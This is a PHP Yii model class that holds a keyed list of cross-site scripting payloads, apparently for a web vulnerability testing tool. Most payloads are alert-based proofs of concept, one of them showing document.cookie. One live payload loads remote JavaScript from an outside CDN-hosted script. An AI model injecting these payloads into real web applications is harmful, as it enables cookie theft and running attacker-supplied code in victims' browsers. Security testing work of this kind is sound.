<?php

namespace app\models;

use Yii;
use yii\base\Model;

class XSSAttack extends Model {
	protected array $payloads;

	public function __construct() {
		$this->payloads = [];
		$this->payloads['js-alert'] = '<script>alert(1)</script>';
		$this->payloads['basic-xss-test'] = '<SCRIPT SRC=https://cdn.jsdelivr.net/gh/Moksh45/host-xss.rocks/index.js></SCRIPT>';
		/*$this->payloads['malformed-a-tags'] = '\<a onmouseover="alert(document.cookie)"\>xxs link\</a\>';
		$this->payloads['malformed-img-tags'] = '<IMG """><SCRIPT>alert("XSS")</SCRIPT>"\>';
		$this->payloads['fromCharCode'] = '<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>';
		$this->payloads['Default SRC Tag'] = '<IMG SRC=# onmouseover="alert(\'xxs\')">';
		$this->payloads['Empty SRC Tag'] = '<IMG SRC= onmouseover="alert(\'xxs\')">';
		/*$this->payloads[''] = '';
		$this->payloads[''] = '';
		$this->payloads[''] = '';
		$this->payloads[''] = '';
		$this->payloads[''] = '';*/
	}

	public function getAllPayloads() { return $this->payloads; }

	public function findPayload($attack_id) : ?string {
		foreach ($this->payloads as $payload_id => $payload) {
			if ($attack_id == $payload_id) {
				return $payload;
			}
		}
		return '';
	}
}